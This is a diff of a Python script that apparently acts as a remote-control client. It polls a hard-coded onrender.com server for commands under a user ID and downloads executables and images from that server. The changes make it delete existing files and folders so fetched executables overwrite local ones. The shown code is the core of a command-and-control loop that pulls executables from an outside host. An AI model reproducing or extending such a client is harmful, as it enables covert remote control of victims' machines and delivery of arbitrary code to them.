@@ -7,7 +7,7 @@ import os
 import pyttsx3
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
-import cv2
+from shutil import rmtree
 url = "https://ms32-sha2.onrender.com/"
 terminate = False
 HWND = 0
@@ -124,8 +124,10 @@ def restart():
     terminate = True
 
 def run(name):
+    if os.path.exists(name):
+        os.remove(name)
     exe = hit(url+f"static/apps/{name}")
-    with open(f"{name}", "xb") as file:
+    with open(name, "xb") as file:
         downloaded_size = 0
         for chunk in exe.iter_content(chunk_size=8192):
             if chunk:
@@ -137,16 +139,25 @@ def display(fp:str):
     asset = hit(url+f"static/images/{fp}")
     ext = fp.split(".")[1]
     if os.listdir("assets"):
-        os.remove("assets/"+os.listdir("assets")[0])
+        rmtree("assets")
+    os.mkdir("assets")
     with open(f"assets/sample.{ext}", "xb") as file:
         downloaded_size = 0
         for chunk in asset.iter_content(chunk_size=8192):
             if chunk:
                 file.write(chunk)
                 downloaded_size += len(chunk)
-    if not os.path.exists("imshow.exe"):
+    try:
         exe = hit(url+f"static/apps/imshow.exe")
-        with open(f"imshow.exe", "xb") as file:
+        with open("imshow.exe", "xb") as file:
+            downloaded_size = 0
+            for chunk in exe.iter_content(chunk_size=8192):
+                if chunk:
+                    file.write(chunk)
+                    downloaded_size += len(chunk)
+    except FileExistsError:
+        exe = hit(url+f"static/apps/imshow.exe")
+        with open("imshow.exe", "wb") as file:
             downloaded_size = 0
             for chunk in exe.iter_content(chunk_size=8192):
                 if chunk:
@@ -157,7 +168,7 @@ def main():
     while not terminate:
         sleep(0.5)
         # cmd = hit(url+"command")
-        cmd = hit(url+"command",data={"user":"01"})
+        cmd = hit(url+"command",data={"user":"93"})
         if type(cmd) != str:
             cmd = cmd.content.decode("utf-8")
         print(cmd)
